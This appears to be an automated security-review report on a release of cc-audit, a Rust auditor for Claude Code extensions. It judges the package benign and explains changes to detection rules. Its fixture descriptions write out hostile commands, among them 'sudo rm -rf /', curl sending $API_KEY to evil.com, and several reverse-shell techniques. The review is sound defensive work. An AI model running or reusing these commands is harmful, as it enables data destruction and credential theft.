identification: cc-audit 3.17.7 source distribution: Rust security auditor for Claude Code skills, hooks, MCP servers and dependencies
decisive_evidence: Fetched v3.17.6+incompatible through forager from proxy.golang.org; forager verified the module against sum.golang.org. Archive and .forage.json remain in scratch/cc-audit-review/prior/golang.

Both archives have 456 members. No added or removed files. Seven modified files: .release-please-manifest.json, CHANGELOG.md, Cargo.lock, Cargo.toml, src/rules/builtin/permission.rs, src/rules/builtin/subagent_rules.rs, xtask/Cargo.toml. release.diff records the complete content diff.

Production changes remove overbroad line-wide restricted-permission exclusions that masked co-located unrestricted Bash/Write grants. Added regression tests cover those combinations. Cargo.lock changes only the cc-audit and xtask versions; dependency versions are unchanged.

All attack examples and exfiltration.rs are byte-identical to v3.17.6. README explicitly describes bypass-attempts as malicious patterns used to test and improve the auditor. No reviewed package entrypoint executes these example files.

main dispatches explicit CLI subcommands; handle_check reads requested paths and runs the scan. rules() constructs Regex values; RuleEngine::check_line compares patterns and exclusions against input and builds findings. Python and shell code in exfiltration.rs is test string data, not launched code.

The distribution, explicit test purpose, unchanged fixture content, and permission-only executable diff tip the package judgment to BENIGN. No installation history, operator authorization, or evidence that a fixture was deployed as a payload was supplied. Running the bundled attack scripts would remain dangerous.

execution_review.polyglot.sh: Unguarded executable reverse-shell examples: Python connects TCP then duplicates socket descriptors to stdin/stdout/stderr and calls an interactive shell; Perl redirects standard handles to its socket; Ruby and PHP use socket descriptors in shell redirections; Bash connects /dev/tcp and bridges stdio. Later examples include an fd-command loop, Awk co-process command execution, Lua socket plus shell, a same-FIFO telnet shell relay, and socat spawning a PTY shell. Earlier blocking commands and the loop can prevent later examples from running. The retained hostile dev-tcp trait describes real executable coupling, not the package author's intent.
execution_review.hex-octal.sh: Hex echo within bash -c reconstructs sudo rm -rf / (an attempted destructive command; platform safeguards can reject it). printf hex bytes form the curl command word, which sends $SECRET as request data. ANSI-C quotes reconstruct sudo for deletion of /tmp/target. Octal text independently decodes to curl https://evil.com -d $API_KEY, but the external echo -e spelling is nonportable and the octal form lacks the zero prefix expected by Bash echo; do not claim successful decoding/exfiltration. MNUGK4TF Base32-decodes to chere, not curl as the comment claims, then is piped into Bash. Supported decoder invocations and concealment remain detected.
execution_review.node-evasion.js: Top-level dynamic require resolves child_process, and cp.exec sends API_KEY through curl -d. eval builds curl from joined fragments; a Function constructor is invoked with require; vm.runInThisContext receives child_process source. Buffer Base64-decodes curl https://evil.com -d $API_KEY and passes it to exec. Further code modifies Object.prototype.exec, dynamically imports child_process, starts an eval worker containing secret-bearing curl, POSTs JSON containing process.env.API_KEY with fetch, and sends process.env.SECRET when a WebSocket opens. Missing require in a VM context or other runtime errors can halt later statements. Structured call, env/body, worker, eval, Base64 and WebSocket observations already cover the primitives; generic credential transmission also occurs in legitimate authentication, so no hostility is invented solely from a secret-named variable.
execution_review.application_io: Explicit remote scanning clones user-selected repositories with git; the configured MCP proxy binds a listener and connects to its configured target to inspect/relay protocol traffic. These behaviors fit the advertised auditor. The reviewed release does not add a network, process, persistence, cleanup, privilege, crypto, or payload-staging execution path.

rule_changes.reason: needs:3 counts overlapping connect, socket-dup2 and inline-Python observations as separate variants, or combines them with an unrelated shell pipeline. No injection surface or independent reverse-shell variants are required. Real benign exfiltration.rs test literals demonstrate the false claim. The additional socket-client-and-help control also matched before retirement without executing any shell. All constituent primitives and actual reverse-shell rules are retained. Exact and ancestor-selector audits found no YAML consumers; no standalone supported catalog/injection behavior is erased.

A shebang and decoder-to-command execution establish obfuscation without an attack-specific payload. Existing printf-built bun-install controls and a harmless printf-built printf command demonstrate legitimate possible effects. Attack-specific behavior must be established independently; encoding, execution and concealment observations remain.

rule_changes.action: hostile to suspicious; matcher and reference population retained
rule_changes.reason: An out-of-test-path harmless printf-built printf command exposed the same unsupported attack-purpose inference. Command reconstruction establishes concealment, not a hostile effect. This rule does not fire on the supplied archive. Exact and ancestor consumer audit found ten directory selectors used only in presence-based unless/downgrade checks; retaining the matcher leaves all those consumers satisfied exactly as before.

Same parsed echo call must have -e and consecutive hexadecimal or valid zero-prefixed octal byte escapes. Both API operation context and actual escaped input are required. No network, payload or runtime success is inferred.
Parsed base32 command selects -d or --decode. Comments, quoted command text and encoding-mode base32 do not qualify.

scan_method: atomscan --no-update --analyze local --mode slow --follow=none -f json; cleave facts for archive and all four listed members. Same-options baseline restored original changed YAML files in a scratch trait snapshot; before/after each contain the same 583 analyzed units. The first exploratory scan accidentally enabled reference following because --follow none must be --follow=none; its eight additional notable reference findings are excluded from the controlled comparison. Hostile/suspicious counts are unchanged by that correction.

coverage.same_options_change_audit: Every notable-or-higher finding across all 583 matched units was compared. Only the retired invalid catalog, the retained decoder severity, and the two new decoder observations changed. No other attack detections were lost. The companion generic reconstruction severity correction does not change a finding in the supplied archive.
coverage.external_controls: 47 existing reverse-shell/obfuscation/near-miss files outside this batch: controls-before.jsonl vs controls-after.jsonl has zero finding or severity differences. These include multiple language/relay reverse-shell fixtures and Python socket-only and local-tty controls.
coverage.focused_controls: check.py copies seven fixtures outside test/example directories before static analysis. Checks both echo forms, both Base32 options, comments/string/encoding-mode near misses, a harmless obfuscated command retained at suspicious by both generic reconstruction rules, and socket+dup2+unrelated help text. Fixtures are never executed.
coverage.prior_release: Re-scanning v3.17.6 reproduces the same 3 hostile/1 suspicious findings before corrections and 1 hostile/2 suspicious after. The queue's earlier no-detection result is not reproducible with this rule version.
coverage.classifier: Archive probability 0.99 / calibrated level 25 before; 0.90883887 / level -1 after. It no longer flags the archive at any calibrated level, agreeing with BENIGN. The executable polyglot member also falls from level 20000 to -1 despite the accurate retained hostile dev-tcp rule: an ML behavior-coverage disagreement, not a reason to restore the false catalog. No rule/classifier score was tuned to force a verdict.
coverage.limitations: Static source analysis; attack fixtures were not executed and no embedded endpoint was contacted intentionally. Cleave reports incomplete embedded-source/flow extraction on some workflow and fixture units; the complete release content diff and manual execution-path review were used independently. No runtime-success, remote-payload, or deployment authorization claim is made.
coverage.renamed_external_controls: 44 existing language/relay reverse-shell and shell-obfuscation fixtures copied outside test directories and compared using original/current traits. Only intended generic concealment severity/retirement changes; every other suspicious/hostile finding retained. See renamed-control-diff.json.
coverage.final_rescan: after-final.jsonl confirms the same 583 units and exactly identical finding IDs/severities to after.jsonl after the companion severity correction; archive classifier probability and calibrated level also unchanged.
